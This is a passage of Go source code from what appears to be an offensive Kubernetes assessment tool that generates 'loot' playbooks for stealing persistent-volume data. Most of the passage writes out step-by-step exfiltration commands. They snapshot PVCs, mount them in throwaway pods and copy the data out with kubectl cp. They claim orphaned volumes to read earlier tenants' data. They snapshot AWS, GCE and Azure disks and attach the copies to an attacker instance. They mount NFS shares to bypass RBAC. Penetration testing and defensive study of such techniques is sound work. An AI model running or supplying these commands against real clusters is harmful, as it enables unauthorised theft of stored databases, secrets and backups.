			Add("EOF").
			Add("#").
			Add("# Step 2: Wait for snapshot ready").
			Addf("kubectl get volumesnapshot %s-snapshot -n %s -w", finding.PVCName, ns).
			Add("#").
			Add("# Step 3: Create PVC from snapshot").
			Addf(`cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: %s-exfil
  namespace: %s
spec:
  dataSource:
    name: %s-snapshot
    kind: VolumeSnapshot
    apiGroup: snapshot.storage.k8s.io
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: %s
EOF`, finding.PVCName, ns, finding.PVCName, finding.Capacity).
			Add("#").
			Add("# Step 4: Mount and exfiltrate").
			Addf(`cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: snapshot-exfil-%s
  namespace: %s
spec:
  containers:
  - name: exfil
    image: alpine
    command: ["sleep", "3600"]
    volumeMounts:
    - name: data
      mountPath: /data
  volumes:
  - name: data
    persistentVolumeClaim:
      claimName: %s-exfil
EOF`, finding.PVCName, ns, finding.PVCName).
			Add("#").
			Add("# Step 5: Copy data").
			Addf("kubectl exec snapshot-exfil-%s -n %s -- tar czf /tmp/data.tar.gz /data", finding.PVCName, ns).
			Addf("kubectl cp %s/snapshot-exfil-%s:/tmp/data.tar.gz ./snapshot-%s.tar.gz", ns, finding.PVCName, finding.PVCName).
			Add("#").
			Add("# Step 6: Cleanup").
			Addf("kubectl delete pod snapshot-exfil-%s -n %s", finding.PVCName, ns).
			Addf("kubectl delete pvc %s-exfil -n %s", finding.PVCName, ns).
			Addf("kubectl delete volumesnapshot %s-snapshot -n %s", finding.PVCName, ns).
			Add("")
	}

	// 7. PV-Orphaned - Orphaned and Retain policy volumes
	if finding.OrphanedVolume || finding.UnusedVolume || finding.ReclaimPolicy == "Retain" {
		loot.Section("PV-Orphaned").
			Addf("\n# ═══════════════════════════════════════════════════════════").
			Addf("# PV: %s", finding.PVName).
			Addf("# Status: %s", finding.Status).
			Addf("# Reclaim Policy: %s", finding.ReclaimPolicy).
			Addf("# ═══════════════════════════════════════════════════════════")

		if finding.OrphanedVolume {
			loot.Section("PV-Orphaned").
				Add("#").
				Add("# [ORPHANED] Volume was released - may contain previous tenant data").
				Add("#").
				Add("# Step 1: Remove claimRef to make volume Available:").
				Addf("kubectl patch pv %s -p '{\"spec\":{\"claimRef\": null}}'", finding.PVName).
				Add("#").
				Add("# Step 2: Create PVC to claim the orphaned volume:").
				Addf(`cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: claim-orphaned-%s
  namespace: default
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: %s
  volumeName: %s
EOF`, finding.PVName, finding.Capacity, finding.PVName).
				Add("#").
				Add("# Step 3: Create inspector pod:").
				Addf(`cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: orphan-inspector-%s
  namespace: default
spec:
  containers:
  - name: inspector
    image: alpine
    command: ["sleep", "3600"]
    volumeMounts:
    - name: data
      mountPath: /data
  volumes:
  - name: data
    persistentVolumeClaim:
      claimName: claim-orphaned-%s
EOF`, finding.PVName, finding.PVName).
				Add("#").
				Add("# Step 4: Access old data:").
				Addf("kubectl exec -it orphan-inspector-%s -- sh", finding.PVName).
				Addf("kubectl exec orphan-inspector-%s -- find /data -type f | head -50", finding.PVName).
				Add("#").
				Add("# Cleanup:").
				Addf("kubectl delete pod orphan-inspector-%s", finding.PVName).
				Addf("kubectl delete pvc claim-orphaned-%s", finding.PVName)
		}

		if finding.UnusedVolume {
			loot.Section("PV-Orphaned").
				Add("#").
				Add("# [UNBOUND] Volume is available - check for residual data").
				Add("#").
				Add("# Create PVC to claim and inspect:").
				Addf(`cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: claim-unbound-%s
  namespace: default
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: %s
  volumeName: %s
EOF`, finding.PVName, finding.Capacity, finding.PVName)
		}

		if finding.ReclaimPolicy == "Retain" && !finding.OrphanedVolume && !finding.UnusedVolume {
			loot.Section("PV-Orphaned").
				Add("#").
				Add("# [RETAIN POLICY] Volume will persist after PVC deletion").
				Add("# Risk: Data remains accessible after application is removed").
				Add("#").
				Add("# To access data after PVC deletion:").
				Add("# 1. Delete the PVC (data remains on volume):").
				Addf("#    kubectl delete pvc %s -n %s", finding.PVCName, finding.PVCNamespace).
				Add("# 2. Volume status changes to 'Released'").
				Add("# 3. Remove claimRef:").
				Addf("#    kubectl patch pv %s -p '{\"spec\":{\"claimRef\": null}}'", finding.PVName).
				Add("# 4. Create new PVC to claim the volume with old data")
		}

		loot.Section("PV-Orphaned").Add("")
	}
}

// generateSnapshotLoot enumerates volume snapshots
func generateSnapshotLoot(ctx context.Context, clientset *kubernetes.Clientset, loot *shared.LootBuilder) {
	loot.Section("PV-Snapshots").
		Add("\n# ═══════════════════════════════════════════════════════════").
		Add("# CLUSTER-WIDE SNAPSHOT ENUMERATION").
		Add("# ═══════════════════════════════════════════════════════════").
		Add("#").
		Add("# Check if VolumeSnapshot CRD exists:").
		Add("kubectl get crd volumesnapshots.snapshot.storage.k8s.io").
		Add("#").
		Add("# List all VolumeSnapshots:").
		Add("kubectl get volumesnapshots --all-namespaces -o wide").
		Add("#").
		Add("# List VolumeSnapshotClasses:").
		Add("kubectl get volumesnapshotclasses").
		Add("#").
		Add("# List VolumeSnapshotContents (cluster-scoped):").
		Add("kubectl get volumesnapshotcontents").
		Add("#").
		Add("# Find snapshots of sensitive PVCs:").
		Add("kubectl get volumesnapshots --all-namespaces -o json | jq -r '.items[] | select(.spec.source.persistentVolumeClaimName | test(\"db|database|secret|backup|vault\")) | \"\\(.metadata.namespace)/\\(.metadata.name) -> \\(.spec.source.persistentVolumeClaimName)\"'").
		Add("")
}

// detectVolumeSource returns volume type, cloud volume ID, and provisioner
func detectVolumeSource(source corev1.PersistentVolumeSource) (string, string, string) {
	if source.AWSElasticBlockStore != nil {
		return "AWS EBS", source.AWSElasticBlockStore.VolumeID, "kubernetes.io/aws-ebs"
	}
	if source.GCEPersistentDisk != nil {
		return "GCE PD", source.GCEPersistentDisk.PDName, "kubernetes.io/gce-pd"
	}
	if source.AzureDisk != nil {
		return "Azure Disk", source.AzureDisk.DiskName, "kubernetes.io/azure-disk"
	}
	if source.AzureFile != nil {
		return "Azure File", source.AzureFile.ShareName, "kubernetes.io/azure-file"
	}
	if source.CSI != nil {
		volumeHandle := "<NONE>"
		if source.CSI.VolumeHandle != "" {
			volumeHandle = source.CSI.VolumeHandle
		}
		return "CSI", volumeHandle, source.CSI.Driver
	}
	if source.NFS != nil {
		return "NFS", fmt.Sprintf("%s:%s", source.NFS.Server, source.NFS.Path), "nfs"
	}
	if source.HostPath != nil {
		return "HostPath", source.HostPath.Path, "hostPath"
	}
	if source.Local != nil {
		return "Local", source.Local.Path, "local"
	}
	if source.ISCSI != nil {
		return "iSCSI", fmt.Sprintf("%s:%s", source.ISCSI.TargetPortal, source.ISCSI.IQN), "iscsi"
	}
	if source.Glusterfs != nil {
		return "Glusterfs", fmt.Sprintf("%s:%s", source.Glusterfs.EndpointsName, source.Glusterfs.Path), "glusterfs"
	}
	if source.RBD != nil {
		return "RBD/Ceph", source.RBD.RBDImage, "rbd"
	}
	if source.Cinder != nil {
		return "OpenStack Cinder", source.Cinder.VolumeID, "cinder"
	}
	if source.FC != nil {
		return "Fibre Channel", strings.Join(source.FC.TargetWWNs, ","), "fc"
	}
	if source.Flocker != nil {
		return "Flocker", source.Flocker.DatasetName, "flocker"
	}
	if source.VsphereVolume != nil {
		return "vSphere", source.VsphereVolume.VolumePath, "vsphere"
	}
	if source.Quobyte != nil {
		return "Quobyte", source.Quobyte.Volume, "quobyte"
	}
	if source.PhotonPersistentDisk != nil {
		return "Photon PD", source.PhotonPersistentDisk.PdID, "photon"
	}
	if source.PortworxVolume != nil {
		return "Portworx", source.PortworxVolume.VolumeID, "portworx"
	}
	if source.ScaleIO != nil {
		return "ScaleIO", source.ScaleIO.VolumeName, "scaleio"
	}
	if source.StorageOS != nil {
		return "StorageOS", source.StorageOS.VolumeName, "storageos"
	}
	return "<UNKNOWN>", "<NONE>", "<NONE>"
}

// generateCloudVolumeLoot generates cloud-specific commands to access volumes
func generateCloudVolumeLoot(volumeType, volumeID, pvName string) []string {
	loot := []string{fmt.Sprintf("\n# PV: %s (%s)", pvName, volumeType)}

	switch volumeType {
	case "AWS EBS":
		loot = append(loot, "# AWS EBS Volume Access:")
		loot = append(loot, fmt.Sprintf("aws ec2 describe-volumes --volume-ids %s", volumeID))
		loot = append(loot, "# Check encryption:")
		loot = append(loot, fmt.Sprintf("aws ec2 describe-volumes --volume-ids %s --query 'Volumes[0].Encrypted'", volumeID))
		loot = append(loot, "# Create snapshot for exfiltration:")
		loot = append(loot, fmt.Sprintf("aws ec2 create-snapshot --volume-id %s --description 'Snapshot of %s'", volumeID, pvName))
		loot = append(loot, "# Create volume from snapshot and attach to attacker instance:")
		loot = append(loot, "# SNAPSHOT_ID=$(aws ec2 create-snapshot --volume-id "+volumeID+" --query 'SnapshotId' --output text)")
		loot = append(loot, "# aws ec2 wait snapshot-completed --snapshot-ids $SNAPSHOT_ID")
		loot = append(loot, "# NEW_VOL=$(aws ec2 create-volume --snapshot-id $SNAPSHOT_ID --availability-zone <az> --query 'VolumeId' --output text)")
		loot = append(loot, "# aws ec2 attach-volume --volume-id $NEW_VOL --instance-id <attacker-instance-id> --device /dev/sdf")
		loot = append(loot, "# Mount and exfiltrate data")

	case "GCE PD":
		loot = append(loot, "# GCE Persistent Disk Access:")
		loot = append(loot, fmt.Sprintf("gcloud compute disks describe %s --zone <zone>", volumeID))
		loot = append(loot, "# Create snapshot for exfiltration:")
		loot = append(loot, fmt.Sprintf("gcloud compute disks snapshot %s --snapshot-names=%s-snapshot --zone <zone>", volumeID, pvName))
		loot = append(loot, "# Create disk from snapshot and attach:")
		loot = append(loot, fmt.Sprintf("# gcloud compute disks create %s-copy --source-snapshot=%s-snapshot --zone <zone>", pvName, pvName))
		loot = append(loot, fmt.Sprintf("# gcloud compute instances attach-disk <attacker-instance> --disk=%s-copy --zone <zone>", pvName))
		loot = append(loot, "# Mount and exfiltrate data")

	case "Azure Disk":
		loot = append(loot, "# Azure Disk Access:")
		loot = append(loot, fmt.Sprintf("az disk show --name %s --resource-group <rg>", volumeID))
		loot = append(loot, "# Create snapshot for exfiltration:")
		loot = append(loot, fmt.Sprintf("az snapshot create --resource-group <rg> --source %s --name %s-snapshot", volumeID, pvName))
		loot = append(loot, "# Create disk from snapshot and attach:")
		loot = append(loot, fmt.Sprintf("# az disk create --resource-group <rg> --name %s-copy --source %s-snapshot", pvName, pvName))
		loot = append(loot, fmt.Sprintf("# az vm disk attach --resource-group <rg> --vm-name <attacker-vm> --name %s-copy", pvName))
		loot = append(loot, "# Mount and exfiltrate data")

	case "NFS":
		loot = append(loot, "# NFS Volume Direct Access:")
		loot = append(loot, fmt.Sprintf("# Mount point: %s", volumeID))
		parts := strings.Split(volumeID, ":")
		if len(parts) == 2 {
			loot = append(loot, fmt.Sprintf("mkdir -p /mnt/%s", pvName))
			loot = append(loot, fmt.Sprintf("mount -t nfs %s /mnt/%s", volumeID, pvName))
			loot = append(loot, "# Access data directly (bypass Kubernetes RBAC)")
		}

	case "CSI":
		loot = append(loot, "# CSI Volume - check driver-specific tools")
		loot = append(loot, fmt.Sprintf("# Volume Handle: %s", volumeID))
		loot = append(loot, "# Consult CSI driver documentation for direct access methods")
	}

	loot = append(loot, "")
	return loot
}

// formatDuration formats a duration into human-readable string
func persistentVolumesFormatDuration(d time.Duration) string {
	if d.Hours() > 24*365 {
		years := int(d.Hours() / 24 / 365)
		return fmt.Sprintf("%dy", years)
	}
	if d.Hours() > 24*30 {
		months := int(d.Hours() / 24 / 30)
		return fmt.Sprintf("%dmo", months)
	}
	if d.Hours() > 24 {
		days := int(d.Hours() / 24)
		return fmt.Sprintf("%dd", days)
	}
	if d.Hours() > 1 {
		hours := int(d.Hours())
		return fmt.Sprintf("%dh", hours)
	}
	if d.Minutes() > 1 {
		minutes := int(d.Minutes())
		return fmt.Sprintf("%dm", minutes)
	}
	return "< 1m"
}
